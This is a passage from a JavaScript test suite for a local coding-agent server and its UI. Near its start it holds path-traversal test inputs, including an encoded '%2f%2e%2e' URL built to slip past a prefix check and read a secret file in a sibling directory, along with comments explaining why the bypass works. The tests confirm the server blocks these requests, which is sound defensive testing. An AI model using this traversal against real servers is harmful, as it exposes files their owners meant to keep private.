        eq('listar fuera -> 403', (await post('fs/list', { path: '../..' })).status, 403);
        ok('el archivo de fuera sigue intacto',
            (await nodefs.readFile(nodePath.join(os.tmpdir(), 'rubus-fuera.txt'), 'utf8')) === 'NO deberías leer esto');

        // Round trip inside the boundary
        await post('fs/write', { path: 'sub/nuevo.txt', content: 'hola' });
        eq('escribe y relee dentro', (await (await post('fs/read', { path: 'sub/nuevo.txt' })).json()).content, 'hola');
        const listed = await (await post('fs/list', { path: '.' })).json();
        ok('lista el contenido de la raíz', listed.entries.some(e => e.name === 'dentro.txt'));

        // Static + traversal on the static handler
        eq('sirve index.html', (await fetch(`${base}/`)).status, 200);
        eq('sirve módulos ESM', (await fetch(`${base}/js/core/engine.js`)).status, 200);
        eq('traversal en estáticos -> 404', (await fetch(`${base}/../package.json`)).status, 404);

        // The escape a `startsWith(PUBLIC)` guard cannot see.
        //
        // `new URL` normalises `..` and `%2e%2e` away before the handler ever
        // runs, so the dot segments alone go nowhere. `%2f` is NOT normalised:
        // smuggle the separator and the dots ride along in the clear. That
        // lands on a SIBLING of public/ — and "…/public-fuga" does start with
        // "…/public", so the prefix check waves it through. Only a real
        // containment test (path.relative) refuses it.
        //
        // The decoy directory is created here rather than assumed: the hole is
        // invisible without a sibling to reach, which is exactly why it can sit
        // in a codebase for a long time.
        const fuga = nodePath.join(REPO_ROOT, 'public-fuga-selftest');
        await nodefs.mkdir(fuga, { recursive: true });
        await nodefs.writeFile(nodePath.join(fuga, 'clave.txt'), 'SECRETO-QUE-NO-SE-SIRVE', 'utf8');
        try {
            const escapado = await fetch(`${base}/x%2f%2e%2e%2f%2e%2e%2fpublic-fuga-selftest/clave.txt`);
            ok('traversal con %2f no alcanza un hermano de public/', escapado.status === 403, `HTTP ${escapado.status}`);
            ok('el secreto del hermano no se sirve', !(await escapado.text()).includes('SECRETO-QUE-NO-SE-SIRVE'));
        } finally {
            await nodefs.rm(fuga, { recursive: true, force: true }).catch(() => {});
        }

        eq('ruta de API desconocida -> 404', (await post('nope', {})).status, 404);

        // Exec streams NDJSON and reports the exit code
        const execRes = await post('exec', { command: 'node --version', timeoutMs: 20000 });
        eq('exec responde 200', execRes.status, 200);
        const lines = (await execRes.text()).trim().split('\n').map(l => JSON.parse(l));
        ok('exec transmite stdout', lines.some(l => l.stream === 'stdout' && /v\d+/.test(l.text)));
        ok('exec termina con exitCode 0', lines.some(l => l.done && l.exitCode === 0));

        // ── cancelar de verdad mata el comando ────────────────────────────
        // Two bugs shared these lines and each hid the other: the disconnect
        // listener sat on `req`, where it never fires, and the kill went to the
        // shell rather than to the command, which on Windows leaves the real
        // process orphaned. Either one alone means Cancel does not cancel.
        //
        // Proved through the filesystem, not the process table: a heartbeat
        // that keeps writing after the kill is the same claim, and it needs no
        // pid and no platform-specific way to look one up. Timestamps rather
        // than a byte count, because "the file stopped growing" is also what a
        // command that finished on its own looks like.
        //
        // The heartbeat prints to stdout as well as to disk, and that is
        // load-bearing: `writeHead` alone does not reach the socket, so without
        // output the client would not receive the response — and could not
        // abort it — until the command had already ended. That is what made an
        // earlier version of this test pass against the broken server.
        //
        // It also gives up on its own after 20s, so a regression cannot leave a
        // stray process running for the rest of the suite.
        await nodefs.writeFile(nodePath.join(root, 'latido.js'), [
            "const fs = require('fs');",
            "const t = setInterval(() => { fs.appendFileSync('latido.txt', Date.now() + '\\n'); process.stdout.write('.'); }, 100);",
            'setTimeout(() => { clearInterval(t); process.exit(0); }, 20000);'
        ].join('\n'), 'utf8');

        /** When did the command last prove it was alive? */
        const ultimoLatido = async () => {
            try {
                const l = (await nodefs.readFile(nodePath.join(root, 'latido.txt'), 'utf8')).trim().split('\n');
                return Number(l[l.length - 1]) || 0;
            } catch { return 0; }
        };

        const abortar = new AbortController();
        const vivo = await fetch(`${base}/api/exec`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${TOKEN}` },
            body: JSON.stringify({ command: 'node latido.js', timeoutMs: 60000 }),
            signal: abortar.signal
        });
        eq('exec largo responde 200', vivo.status, 200);

        // Waiting for a chunk, not for a clock: this is also the assertion that
        // the headers were flushed before the command produced anything.
        await vivo.body.getReader().read();
        await new Promise(r => setTimeout(r, 400));
        ok('el comando estaba vivo antes de cancelar', (await ultimoLatido()) > 0);

        const alAbortar = Date.now();
        abortar.abort();
        await new Promise(r => setTimeout(r, 1500));
        const despues = await ultimoLatido();
        ok('el comando muere cuando el cliente se va', despues <= alAbortar + 400,
            `siguió latiendo ${despues - alAbortar}ms después de abortar`);

        // Same kill, other trigger: a timeout that does not stop the process is
        // a label, not a limit.
        await nodefs.rm(nodePath.join(root, 'latido.txt'), { force: true }).catch(() => {});
        const inicioTimeout = Date.now();
        const conTimeout = await post('exec', { command: 'node latido.js', timeoutMs: 1200 });
        // The clock starts when the SERVER closes the stream, which it does
        // after the kill — not when the headers arrive, which is now immediate.
        const cuerpoTimeout = await conTimeout.text();
        const finTimeout = Date.now();
        const cerrado = cuerpoTimeout.trim().split('\n').map(l => JSON.parse(l)).find(l => l.done);
        ok('el timeout se reporta', cerrado && cerrado.timedOut === true, JSON.stringify(cerrado));

        // The response has to close when the timeout fires, not when the
        // command eventually gives up. Kill only the shell and the orphan keeps
        // the stdout pipe open, so 'close' never arrives and the caller waits
        // out the full command — a 1.2s timeout that returns twenty seconds
        // later, which is the same as no timeout at all.
        ok('el timeout cierra la respuesta a tiempo', finTimeout - inicioTimeout < 6000,
            `la respuesta tardó ${finTimeout - inicioTimeout}ms para un timeout de 1200ms`);

        await new Promise(r => setTimeout(r, 1500));
        const trasTimeout = await ultimoLatido();
        ok('el timeout mata el comando de verdad', trasTimeout <= finTimeout + 400,
            `siguió latiendo ${trasTimeout - finTimeout}ms tras el timeout`);

        // ── proxy: la petición debe llegar a Ollama ──────────────────────
        // Asserts the proxy reaches upstream and returns a verdict, whether or
        // not Ollama is running (reachable → real status + body, unreachable →
        // 502 + explanation).
        //
        // Honest limitation: this does NOT reproduce the abort-timing bug that
        // once lived here (the "client went away" listener was on `req`, which
        // emits 'close' as soon as a POST body is consumed, so every chat
        // request was aborted before leaving the server). Whether that fires
        // early depends on the client's keep-alive behaviour — browsers hit it,
        // Node's fetch does not — so it cannot be triggered from here. It was
        // found, and re-verified, with a real browser run.
        const proxied = await fetch(`${base}/api/ollama/api/tags`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${TOKEN}` },
            body: JSON.stringify({ probe: true })
        });
        const proxiedBody = await proxied.text();
        ok('un POST por el proxy llega a upstream (no se aborta solo)',
            proxiedBody.length > 0,
            `status ${proxied.status}, cuerpo vacío -> la petición se abortó antes de salir`);
        ok('el proxy da un veredicto claro',
            proxied.status === 502 ? /ollama/i.test(proxiedBody) : proxied.status > 0,
            `status ${proxied.status}: ${proxiedBody.slice(0, 120)}`);

        // ── survival ─────────────────────────────────────────────────────
        // The regression that mattered: a client abandoning a stream mid-flight
        // raised an unhandled 'error' on the response and killed the process.
        // Everything after that failed with "Failed to fetch", which points at
        // the browser instead of at the server that quietly died.
        const abortMidStream = async (route, payload) => {
            const ctrl = new AbortController();
            try {
                const r = await fetch(`${base}/api/${route}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${TOKEN}` },
                    body: JSON.stringify(payload),
                    signal: ctrl.signal
                });
                const reader = r.body.getReader();
                await reader.read();      // take one chunk…
                ctrl.abort();             // …then walk away
            } catch { /* abortar es justo lo que queremos */ }
        };

        // A command that keeps talking, so there is a live stream to sever.
        const chatty = process.platform === 'win32'
            ? 'for /L %i in (1,1,80) do @echo linea %i'
            : 'for i in $(seq 1 80); do echo linea $i; done';

        await abortMidStream('exec', { command: chatty, timeoutMs: 20000 });
        await new Promise(r => setTimeout(r, 300));
        let alive = false;
        try { alive = (await fetch(`${base}/api/ping`)).ok; } catch { alive = false; }
        ok('el servidor sobrevive a un cliente que corta un stream de exec', alive);

        await abortMidStream('ollama/api/tags', {});
        await new Promise(r => setTimeout(r, 300));
        try { alive = (await fetch(`${base}/api/ping`)).ok; } catch { alive = false; }
        ok('el servidor sobrevive a un cliente que corta el proxy de Ollama', alive);

        // And still works afterwards, not merely "is listening".
        eq('sigue sirviendo tras los cortes', (await post('fs/read', { path: 'dentro.txt' })).status, 200);
    }

    child.kill();
    await nodefs.rm(root, { recursive: true, force: true }).catch(() => {});
    await nodefs.rm(nodePath.join(os.tmpdir(), 'rubus-fuera.txt'), { force: true }).catch(() => {});
}

// ── navigating a big project on a small context ───────────────────────────
section('contexto pequeño / proyecto grande');
{
    const { outlineFile, readFile } = await import('../core/tools/fs-tools.js');
    const { searchCodebase } = await import('../core/tools/search-tools.js');
    const { ToolRegistry } = await import('../core/tools/index.js');
    const { Bus: TBus } = await import('../core/bus.js');

    // A file big enough that reading it whole is the wrong move.
    const big = [];
    for (let i = 0; i < 60; i++) {
        big.push(`// bloque ${i}`);
        big.push(`export function funcion${i}(a, b) {`);
        for (let j = 0; j < 8; j++) big.push(`    const v${j} = a + b + ${j};`);
        big.push('}');
        big.push('');
    }
    const bigText = big.join('\n');
    const files = new Map([['C:/Repo/src/grande.js', bigText]]);

    const ctx = {
        root: 'C:/Repo',
        security: { resolvePath: (p) => ({ abs: `C:/Repo/${p}`, rel: p, root: 'C:/Repo' }) },
        config: { get: (k, fb) => ({ 'context.fileMaxTokens': 3500, 'context.toolResultMaxChars': 6000 }[k] ?? fb) },
        platform: {
            fs: {
                stat: async (p) => (files.has(p) ? { isFile: true, isDirectory: false, size: files.get(p).length, mtimeMs: 0 } : null),
                readText: async (p) => files.get(p),
                writeText: async (p, c) => { files.set(p, c); },
                readDir: async () => []
            }
        },
        readCache: new Map(),
        recordDiff: () => {},
        contextUsage: () => ({ used: 0, budget: 20000 })
    };

    const outline = await outlineFile.run({ path: 'src/grande.js' }, ctx);
    ok('outline_file funciona', outline.ok, outline.summary);
    ok('outline lista símbolos', outline.data.symbols > 5, `${outline.data.symbols}`);
    ok('outline da números de línea', /L\s*\d+/.test(outline.detail));
    ok('outline NO trae el cuerpo del código', !outline.detail.includes('const v3 ='));
    ok('outline enseña el siguiente paso', outline.detail.includes('around_line'));

    const around = await readFile.run({ path: 'src/grande.js', around_line: 300, max_lines: 40 }, ctx);
    ok('read_file around_line funciona', around.ok);
    ok('around_line centra la ventana', around.data.from < 300 && around.data.to > 300, `${around.data.from}-${around.data.to}`);
    ok('marca que es vista parcial', around.data.partial && around.detail.includes('VISTA PARCIAL'));
    ok('dice cómo seguir leyendo', around.detail.includes('start_line='));

    // A tight context must shrink the read, not blow the window.
    const squeezed = { ...ctx, contextUsage: () => ({ used: 19000, budget: 20000 }) };
    const small = await readFile.run({ path: 'src/grande.js', start_line: 1, max_lines: 3000 }, squeezed);
    const wide = await readFile.run({ path: 'src/grande.js', start_line: 1, max_lines: 3000 }, ctx);
    ok('con el contexto lleno lee menos', (small.data.to - small.data.from) < (wide.data.to - wide.data.from),
        `apretado ${small.data.to - small.data.from} vs holgado ${wide.data.to - wide.data.from}`);

    // Search must carry enough context to often avoid a read at all.
    const searchCtx = {
        ...ctx,
        signal: null,
        platform: {
            ...ctx.platform,
            fs: {
                ...ctx.platform.fs,
                readDir: async (p) => (p === 'C:/Repo'
                    ? [{ name: 'src', path: 'C:/Repo/src', isDirectory: true }]
                    : p === 'C:/Repo/src'
                        ? [{ name: 'grande.js', path: 'C:/Repo/src/grande.js', isDirectory: false }]
                        : [])
            }
        }
    };
    const found = await searchCodebase.run({ query: 'funcion7(', max_results: 5 }, searchCtx);
    ok('search encuentra', found.ok && found.data.matches.length > 0, found.summary);
    ok('search da línea', found.data.matches[0].line > 0);
    ok('search trae contexto alrededor', !!found.data.matches[0].after);
    ok('search sugiere around_line', found.detail.includes('around_line='));

    // The cap must never take finish_step away.
    const reg = new ToolRegistry({ bus: new TBus(), logger: null, config: { get: (k, fb) => fb } });
    for (const cap of [4, 5, 6, 8]) {
        const names = reg.forPhase('act', { maxTools: cap }).map(t => t.name);
        ok(`finish_step sobrevive con maxTools=${cap}`, names.includes('finish_step'), names.join(','));
        ok(`se respeta el tope maxTools=${cap}`, names.length <= Math.max(3, cap), `${names.length}`);
    }
    // outline_file sigue disponible en act, pero ya NO cabe con maxTools=8.
    //
    // El tope obliga a elegir, y al entrar search_web y fetch_url el corte caía
    // justo entre las dos, dejando al modelo capaz de buscar y no de abrir lo
    // encontrado. Se prefirió mantener el par entero: outline_file es un
    // read_file comprimido y su trabajo se puede hacer de otra forma, mientras
    // que "cuál es la firma de esta función de la librería" no lo cubre nada
    // más. Este test dice cuál fue el compromiso, para que se vea al cambiarlo.
    ok('outline_file sigue disponible en act', reg.forPhase('act', { maxTools: 20 }).some(t => t.name === 'outline_file'));
    ok('con el tope de 8 se prioriza el par de internet entero',
        ['search_web', 'fetch_url'].every(n => reg.forPhase('act', { maxTools: 8 }).some(t => t.name === n)),
        reg.forPhase('act', { maxTools: 8 }).map(t => t.name).join(','));
    ok('outline_file está expuesta en explore', reg.forPhase('explore', { maxTools: 8 }).some(t => t.name === 'outline_file'));
}

// ── embeddable component ──────────────────────────────────────────────────
section('componente embebido');
{
    const { createAgent } = await import('../embed/agent.js');

    const agent = await createAgent({ workspace: process.cwd() });
    ok('createAgent devuelve un agente', !!agent && !!agent.engine);
    for (const fn of ['run', 'approve', 'step', 'runAll', 'replan', 'pause', 'cancel', 'on', 'destroy', 'snapshot']) {
        ok(`la API expone ${fn}()`, typeof agent[fn] === 'function');
    }
    ok('expone el estado', typeof agent.state === 'string');
    // Compared against the real cwd, not against a folder name: hard-coding
    // one means the suite breaks the day somebody renames the checkout, and
    // the failure says nothing about the code.
    eq('el workspace se aplicó', P.normalize(agent.engine.config.get('workspace.root', '')), P.normalize(process.cwd()));
    ok('en embebido el plan se auto-aprueba', agent.engine.config.get('agent.autoApprovePlan') === true);
    ok('en embebido los pasos se encadenan', agent.engine.config.get('agent.autoRunSteps') === true);

    // Without a model there must be a clear refusal, not a hang.
    const noModel = await createAgent({ workspace: process.cwd(), settings: { ollama: { model: '' } } });
    noModel.engine.config.set('ollama.model', '');
    let msg = '';
    try { await noModel.run('lo que sea'); } catch (e) { msg = e.message; }
    ok('sin modelo explica el problema', /modelo/i.test(msg), msg);
    await noModel.destroy();

    await agent.destroy();
    ok('destroy no revienta', true);
}

// ── agent.read(): stream sin DOM ──────────────────────────────────────────
section('stream del agente');
{
    const { AgentStream, formatEvent } = await import('../embed/agent-stream.js');
    const { Bus: SBus, EV: SEV } = await import('../core/bus.js');

    const bus = new SBus();
    const stream = new AgentStream(bus);

    // Tokens sueltos se agrupan en una sola lectura.
    bus.emit(SEV.CHAT_DELTA, { text: 'Hola' });
    bus.emit(SEV.CHAT_DELTA, { text: ' mundo' });
    const c1 = await stream.read();
    eq('agrupa los tokens desde la última lectura', c1.text, 'Hola mundo');
    ok('no marca fin mientras corre', c1.done === false);

    // Lo ya entregado no se repite.
    bus.emit(SEV.CHAT_DELTA, { text: '!' });
    eq('no repite lo ya leído', (await stream.read()).text, '!');

    // El razonamiento va aparte del texto.
    bus.emit(SEV.CHAT_THINK, { text: 'pensando' });
    bus.emit(SEV.CHAT_DELTA, { text: 'dicho' });
    const c3 = await stream.read();
    eq('separa thinking de text', [c3.thinking, c3.text], ['pensando', 'dicho']);

    // Los eventos estructurados llegan con su línea legible.
    bus.emit(SEV.TOOL_CALL, { id: 'x', name: 'read_file', args: { path: 'a.js' } });
    const c4 = await stream.read();
    eq('el evento llega tipado', c4.events[0].type, SEV.TOOL_CALL);
    ok('el evento trae línea legible', c4.events[0].line.includes('read_file') && c4.events[0].line.includes('a.js'));

    // read() espera de verdad cuando no hay nada, y despierta al llegar algo.
    const waiting = stream.read();
    let resolvedEarly = false;
    waiting.then(() => { resolvedEarly = true; });
    await new Promise(r => setTimeout(r, 30));
    ok('read() bloquea si no hay nada', !resolvedEarly);
    bus.emit(SEV.CHAT_DELTA, { text: 'tarde' });
    eq('despierta cuando llega texto', (await waiting).text, 'tarde');

    // timeoutMs: para bucles de sondeo que no deben bloquear.
    const t0 = Date.now();
    const timed = await stream.read({ timeoutMs: 40 });
    ok('timeoutMs no bloquea', Date.now() - t0 < 400 && timed.timedOut === true, `${Date.now() - t0}ms`);
    eq('el trozo por timeout viene vacío', timed.text, '');

    // Al terminar: último trozo con done, y después null.
    bus.emit(SEV.CHAT_DELTA, { text: 'final' });
    bus.emit(SEV.DONE, { summary: 'ok', changed: [], progress: { done: 1, total: 1, failed: 0 } });
    const last = await stream.read();
    ok('el último trozo trae el texto pendiente', last.text === 'final');
    ok('el último trozo marca done', last.done === true);
    eq('después de terminar devuelve null', await stream.read(), null);

    // Una tarea nueva rearma el bucle.
    bus.emit(SEV.STATE, { from: 'done', to: 'exploring' });
    bus.emit(SEV.CHAT_DELTA, { text: 'otra vez' });
    const again = await stream.read();
    ok('una tarea nueva rearma el stream', again && again.text.includes('otra vez'));

    // Un consumidor que no lee no puede hacer crecer el buffer sin límite.
    for (let i = 0; i < 6000; i++) bus.emit(SEV.TOOL_CALL, { id: `n${i}`, name: 'think', args: {} });
    const flooded = await stream.read();
    ok('la cola de eventos está acotada', flooded.events.length <= 5000, `${flooded.events.length}`);
    ok('informa de lo que descartó', !!flooded.dropped && flooded.dropped.events > 0);

    // close() termina el bucle aunque haya un lector esperando.
    const pendiente = stream.read();
    stream.close();
    eq('close() desbloquea al lector', await pendiente, null);
    eq('tras close sigue devolviendo null', await stream.read(), null);

    // El iterador asíncrono recorre y termina solo.
    const bus2 = new SBus();
    const s2 = new AgentStream(bus2);
    setTimeout(() => {
        bus2.emit(SEV.CHAT_DELTA, { text: 'uno ' });
        bus2.emit(SEV.CHAT_DELTA, { text: 'dos' });
        bus2.emit(SEV.DONE, { summary: '', changed: [], progress: { done: 1, total: 1, failed: 0 } });
    }, 10);
    let acc = '';
    for await (const chunk of s2) acc += chunk.text;
    eq('for await recoge todo y termina', acc, 'uno dos');
    s2.close();

    ok('formatEvent tolera lo desconocido', formatEvent('inventado', {}) === '');
}

// ── progreso: nada de tiempos muertos sin explicar ────────────────────────
section('progreso');
{
    const { ToolRegistry } = await import('../core/tools/index.js');
    const { Bus: PBus, EV: PEV } = await import('../core/bus.js');
    const { makeThrottle } = await import('../core/util.js');

    // El throttle deja pasar el primero (para que se vea el arranque al
    // instante) y corta los siguientes.
    const t = makeThrottle(1000);
    let hits = 0;
    ok('el throttle deja pasar el primero', t(() => hits++) === true && hits === 1);
    ok('el throttle corta el segundo', t(() => hits++) === false && hits === 1);

    const bus = new PBus();
    const seen = [];
    bus.on(PEV.PROGRESS, (p) => seen.push(p));

    const registry = new ToolRegistry({ bus, logger: null, config: { get: (k, d) => d } });

    const baseCtx = {
        phase: 'act', stepId: 1, availableTools: ['think'], readCache: new Map(),
        setThinkStreak: () => {}, setStepFinished: () => {}, thinkStreak: 0,
        platform: {}, config: { get: (k, d) => d }, security: {}, bus, logger: null,
        repoMap: null, root: 'C:/x', recordDiff: () => {}, requestApproval: async () => false
    };

    // Una herramienta que abre progreso y devuelve por una rama que se olvida
    // de cerrarlo: el registro tiene que cerrarlo igual.
    registry.byName.set('olvidadiza', {
        name: 'olvidadiza', description: '', readOnly: true, mutates: false, params: {},
        run: async (a, ctx) => { ctx.progress('trabajando…', { indeterminate: true }); return { ok: true, summary: 'listo' }; }
    });
    seen.length = 0;
    await registry.execute('olvidadiza', {}, { ...baseCtx, availableTools: ['olvidadiza'] });
    ok('se abrió el progreso', seen.some(p => !p.done));
    ok('el registro lo cierra aunque la herramienta se olvide', seen.some(p => p.done));

    // Y también cuando la herramienta revienta.
    registry.byName.set('explosiva', {
        name: 'explosiva', description: '', readOnly: true, mutates: false, params: {},
        run: async (a, ctx) => { ctx.progress('a punto de fallar…'); throw new Error('boom'); }
    });
    seen.length = 0;
    const boom = await registry.execute('explosiva', {}, { ...baseCtx, availableTools: ['explosiva'] });
    ok('la excepción se convierte en resultado', boom.ok === false);
    ok('el progreso se cierra tras una excepción', seen.some(p => p.done));

    // update() mantiene el mismo id, para que la UI actualice en sitio.
    registry.byName.set('conbarra', {
        name: 'conbarra', description: '', readOnly: true, mutates: false, params: {},
        run: async (a, ctx) => {
            const pr = ctx.progress('empezando', { current: 0, total: 10 });
            pr.update('a la mitad', { current: 5, total: 10 });
            pr.done('acabado');
            return { ok: true, summary: 'ok' };
        }
    });
    seen.length = 0;
    await registry.execute('conbarra', {}, { ...baseCtx, availableTools: ['conbarra'] });
    const ids = new Set(seen.map(p => p.id));
    eq('las actualizaciones comparten id', ids.size, 1);
    eq('llegan las tres fases', seen.length, 3);
    ok('la del medio trae porcentaje real', seen[1].current === 5 && seen[1].total === 10);
    ok('no se cierra dos veces', seen.filter(p => p.done).length === 1);
}

// ── barra de progreso (con un DOM mínimo de mentira) ──────────────────────
section('barra de progreso');
{
    // Un DOM de juguete: sólo lo que ProgressStrip toca. Suficiente para cazar
    // el fallo que motivó esta prueba — la barra escribía sobre su propio nodo
    // y reventaba dentro de un listener del bus, donde nadie lo veía.
    class FakeEl {
        constructor(tag) {
            this.tagName = tag; this.children = []; this.className = ''; this.dataset = {};
            this.style = {}; this._text = ''; this.hidden = false; this.parentNode = null;
        }
        get textContent() { return this._text; }
        set textContent(v) { this._text = String(v); this.children.length = 0; }
        appendChild(c) { c.parentNode = this; this.children.push(c); return c; }
        removeChild(c) { this.children = this.children.filter(x => x !== c); }
        remove() { if (this.parentNode) this.parentNode.removeChild(this); }
        querySelector() { return null; }
        get classList() {
            const self = this;
            return {
                add: (...cs) => { self.className = [...new Set([...self.className.split(' ').filter(Boolean), ...cs])].join(' '); },
                contains: (c) => self.className.split(' ').includes(c)
            };
        }
        find(pred) {
            if (pred(this)) return this;
            for (const c of this.children) { const hit = c.find ? c.find(pred) : null; if (hit) return hit; }
            return null;
        }
    }

    const prevDoc = globalThis.document;
    globalThis.document = { createElement: (t) => new FakeEl(t) };

    try {
        const { ProgressStrip } = await import('../ui/progress.js');
        const host = new FakeEl('div');
        host.hidden = true;
        const strip = new ProgressStrip(host);

        // Indeterminada: sin barra, con etiqueta.
        strip.apply({ id: 'a', label: 'Consultando al modelo…', indeterminate: true, detail: 'act' });
        eq('crea una fila', host.children.length, 1);
        ok('muestra la barra contenedora', host.hidden === false);
        const barA = host.children[0].find(n => n.className.includes('prog-bar'));
        ok('sin denominador no hay barra', barA.hidden === true);

        // Con denominador: barra y porcentaje reales.
        strip.apply({ id: 'b', label: 'Buscando…', current: 300, total: 1200, detail: 'src/x.js' });
        eq('segunda fila', host.children.length, 2);
        const rowB = host.children[1];
        const barB = rowB.find(n => n.className.includes('prog-bar'));
        const fillB = rowB.find(n => n.className.includes('prog-fill'));
        ok('con denominador aparece la barra', barB.hidden === false);
        eq('el relleno refleja el porcentaje', fillB.style.width, '25%');

        // El detalle NO debe pisar el nodo del DOM: éste era el fallo.
        const detB = rowB.find(n => n.className.includes('prog-detail'));
        ok('el detalle sigue siendo un elemento', detB instanceof FakeEl);
        ok('el detalle muestra conteo y ruta', detB.textContent.includes('300/1200') && detB.textContent.includes('src/x.js'));

        // Actualizar en sitio, sin crear filas nuevas.
        strip.apply({ id: 'b', label: 'Buscando…', current: 600, total: 1200 });
        eq('actualiza sin duplicar', host.children.length, 2);
        eq('el relleno avanza', rowB.find(n => n.className.includes('prog-fill')).style.width, '50%');

        // Cerrar deja la fila un instante y luego la quita.
        strip.apply({ id: 'a', done: true, elapsedMs: 3200 });
        strip.apply({ id: 'b', done: true });
        await new Promise(r => setTimeout(r, 900));
        eq('las filas terminadas se van', host.children.length, 0);
        ok('la barra se esconde al quedarse vacía', host.hidden === true);

        strip.destroy();
    } finally {
        if (prevDoc === undefined) delete globalThis.document; else globalThis.document = prevDoc;
    }
}

// ── migración de ajustes ──────────────────────────────────────────────────
section('migración de ajustes');
{
    const { Config, SETTINGS_VERSION, DEFAULTS: D } = await import('../core/config.js');

    const fakeStore = (initial) => {
        let saved = initial;
        return { storage: { get: async () => saved, set: async (_k, v) => { saved = JSON.parse(JSON.stringify(v)); } }, read: () => saved };
    };

    // Ajustes viejos (sin versión) con el razonamiento apagado: la migración
    // tiene que alcanzarlos. Éste es el caso que dejaba la UI sin nada que
    // mostrar durante toda la ejecución.
    const viejo = fakeStore({ agent: { thinkInAct: false, thinkInPlan: false, maxStepAttempts: 5 } });
    const c1 = new Config(viejo);
    await c1.load();
    eq('la migración enciende el razonamiento', [c1.get('agent.thinkInPlan'), c1.get('agent.thinkInAct')], [true, true]);
    ok('describe cada migración aplicada', c1.describeMigrations().length === 2, c1.describeMigrations().join(' | '));

    // v3: la aprobación pasa a automática, y los "false" heredados del antiguo
    // valor por defecto se borran — si se quedaran, pisarían el modo nuevo para
    // siempre y cambiar a 'auto' no haría nada.
    eq('la migración pone la aprobación en auto', c1.get('agent.approvalMode'), 'auto');
    eq('y borra el autoApprovePlan heredado', c1.get('agent.autoApprovePlan', 'sin valor'), 'sin valor');
    eq('respeta lo que el usuario cambió a propósito', c1.get('agent.maxStepAttempts'), 5);
    eq('la versión queda al día en memoria', c1.get('settingsVersion'), SETTINGS_VERSION);

    // Y se persiste: una migración que sólo vive en memoria se repite eternamente.
    eq('la versión se guarda en disco', viejo.read().settingsVersion, SETTINGS_VERSION);

    // Segunda carga: nada que migrar.
    const c2 = new Config(viejo);
    await c2.load();
    eq('no vuelve a migrar', c2.describeMigrations().length, 0);
    ok('el valor migrado se mantiene', c2.get('agent.thinkInAct') === true);

    // Un usuario que apaga el razonamiento DESPUÉS de migrar no debe verlo
    // reencendido en el siguiente arranque.
    c2.set('agent.thinkInAct', false);
    await c2.save();
    const c3 = new Config(viejo);
    await c3.load();
    eq('respeta un apagado posterior', c3.get('agent.thinkInAct'), false);

    // Sin nada guardado: los defaults, sin migraciones.
    const limpio = new Config(fakeStore(null));
    await limpio.load();
    eq('instalación limpia usa los defaults', limpio.get('agent.thinkInAct'), D.agent.thinkInAct);
    eq('instalación limpia no migra nada', limpio.describeMigrations().length, 0);

    // El diagnóstico de overrides sigue siendo cierto.
    const conOverride = new Config(fakeStore({ settingsVersion: SETTINGS_VERSION, ollama: { temperature: 0.9 } }));
    await conOverride.load();
    const ov = conOverride.describeOverrides().find(o => o.path === 'ollama.temperature');
    ok('detecta el ajuste pisado', ov && ov.saved === 0.9 && ov.default === D.ollama.temperature);
}

// ── escritura por frames ──────────────────────────────────────────────────
section('stream-writer');
{
    // rAF de mentira, controlado a mano: así se puede comprobar que los tokens
    // NO tocan el DOM hasta que corre el frame.
    let cola = [];
    const prevRaf = globalThis.requestAnimationFrame;
    const prevCaf = globalThis.cancelAnimationFrame;
    globalThis.requestAnimationFrame = (fn) => { cola.push(fn); return cola.length; };
    globalThis.cancelAnimationFrame = (id) => { cola[id - 1] = null; };
    const correrFrame = () => { const c = cola; cola = []; for (const fn of c) if (fn) fn(); };

    class Nodo {
        constructor(tag) { this.tag = tag; this.children = []; this._t = ''; this.scrollTop = 0; this.scrollHeight = 1000; this.clientHeight = 100; this.escrituras = 0; }
        get ownerDocument() { return { createTextNode: (t) => new Texto(t) }; }
        appendChild(c) { c.parent = this; this.children.push(c); return c; }
        removeChild(c) { this.children = this.children.filter(x => x !== c); }
        get textContent() { return this.children.map(c => c.data ?? c.textContent ?? '').join(''); }
        set textContent(v) { this._t = v; this.escrituras++; }
    }
    class Texto {
        constructor(d) { this.data = d; this.appends = 0; }
        appendData(s) { this.data += s; this.appends++; }
        remove() { if (this.parent) this.parent.removeChild(this); }
    }

    const prevDoc = globalThis.document;
    globalThis.document = { createElement: (t) => new Nodo(t) };

    try {
        const { StreamWriter } = await import('../ui/stream-writer.js');

        const destino = new Nodo('div');
        const scroller = new Nodo('div');
        let framesConCallback = 0;
        const w = new StreamWriter({ target: destino, scrollers: [scroller], onFrame: () => framesConCallback++ });

        // 500 tokens sin que corra ni un frame.
        for (let i = 0; i < 500; i++) w.write('x');
        eq('nada llega al DOM antes del frame', w.textNode.data.length, 0);
        eq('todo queda encolado', w.pending.length, 500);
        eq('un solo frame pedido para 500 tokens', cola.filter(Boolean).length, 1);

        correrFrame();
        eq('el frame escribe todo de una vez', w.textNode.data.length, 500);
        eq('una sola operación sobre el nodo de texto', w.textNode.appends, 1);
        eq('el callback corre una vez por frame', framesConCallback, 1);

        // Segunda tanda: se acumula en el siguiente frame.
        for (let i = 0; i < 300; i++) w.write('y');
        correrFrame();
        eq('dos frames para 800 tokens', w.textNode.appends, 2);
        eq('no se pierde nada', w.textNode.data.length, 800);

        // Pegado al fondo cuando ya lo estaba.
        scroller.scrollTop = 900; scroller.scrollHeight = 1000; scroller.clientHeight = 100;
        w.write('z'); correrFrame();
        eq('sigue pegado al fondo', scroller.scrollTop, scroller.scrollHeight);

        // Y NO lo arrastra si el usuario había subido a leer.
        scroller.scrollTop = 0;
        w.write('w'); correrFrame();
        eq('respeta al usuario que subió', scroller.scrollTop, 0);

        // flush() aplica sin esperar al frame: imprescindible en pestaña oculta.
        w.write('final');
        ok('flush es síncrono', (w.flush(), w.textNode.data.endsWith('final')));
        eq('flush no deja frame pendiente', w.frame, 0);

        // text incluye lo aún encolado, para que end() nunca pierda el último trozo.
        w.write('cola');
        ok('text ve lo pendiente', w.text.endsWith('cola'));

        // dispose cancela el frame y deja de aceptar escrituras.
        w.dispose();
        const antes = w.textNode.data.length;
        w.write('ignorado'); correrFrame();
        eq('tras dispose no escribe', w.textNode.data.length, antes);

        // NUNCA se usa textContent sobre el destino: eso era el coste cuadrático.
        eq('no reescribe el contenedor entero', destino.escrituras, 0);
    } finally {
        globalThis.requestAnimationFrame = prevRaf;
        globalThis.cancelAnimationFrame = prevCaf;
